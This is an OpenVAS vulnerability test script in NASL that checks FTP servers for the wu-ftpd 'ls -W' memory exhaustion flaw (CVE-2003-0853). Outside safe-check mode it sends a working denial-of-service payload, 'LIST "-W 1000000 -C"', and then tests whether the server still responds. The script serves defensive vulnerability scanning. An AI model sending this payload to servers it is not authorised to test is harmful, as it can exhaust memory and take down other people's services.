# OpenVAS Vulnerability Test
# $Id: wuftpd_ls_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: wu-ftpd ls -W memory exhaustion
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# HD Moore suggested fixes and the safe_checks code.
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_solution = "Contact your vendor for a fix";

tag_summary = "The FTP server does not filter arguments to the ls command. 
It is possible to consume all available memory on the machine 
by sending 
	ls '-w 1000000 -C'
See http://www.guninski.com/binls.html";

# Credit: Georgi Guninski discovered this attack


if (description)
{
 script_id(11912);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(8875);
 script_cve_id("CVE-2003-0853", "CVE-2003-0854");
 script_xref(name: "CONECTIVA", value: "CLA-2003:768");
 script_xref(name: "zone-h", value: "3299");

 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 name = "wu-ftpd ls -W memory exhaustion";
 script_name( name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description( desc);
 script_summary( "send ls -w 1000000 -C to the remote FTP server");

 script_category(ACT_MIXED_ATTACK);
 script_family( "FTP");

 script_copyright("Copyright (C) 2003 Michel Arboi");
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}


#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if (! user) user = "anonymous";
if (! pass) pass = "openvas@example.com";

soc = open_sock_tcp(port);
if (!soc) exit(0);

if (! ftp_authenticate(socket:soc, user: user, pass: pass)) exit(0);

port2 = ftp_pasv(socket:soc);
if (!port2)
{
  ftp_close(socket: soc);
  exit(0);
}

soc2 = open_sock_tcp(port2, transport: ENCAPS_IP);

if (!soc2 || safe_checks())
{
  send(socket: soc, data: 'LIST -ABCDEFGHIJKLMNOPQRSTUV\r\n');
  r1 = ftp_recv_line(socket:soc);
  if (egrep(string: r1, pattern: "invalid option|usage:", icase: 1))
    security_warning(port);
 if(soc2)close(soc2);
 ftp_close(socket: soc);
 exit(0);
}
  
start_denial();

send(socket:soc, data: 'LIST "-W 1000000 -C"\r\n');
r1 = ftp_recv_line(socket:soc);
l = ftp_recv_listing(socket: soc2);
r2 = ftp_recv_line(socket:soc);
close(soc2);
ftp_close(socket: soc);

alive = end_denial();
if (! alive)
{
  security_warning(port);
  exit(0);
}

if (egrep(string: r2, pattern: "exhausted|failed", icase: 1))
{
  security_warning(port);
  exit(0);
}

soc = open_sock_tcp(port);
if (! soc || ! ftp_authenticate(socket:soc, user: user, pass: pass))
  security_warning(port);
if (soc) ftp_close(socket: soc);

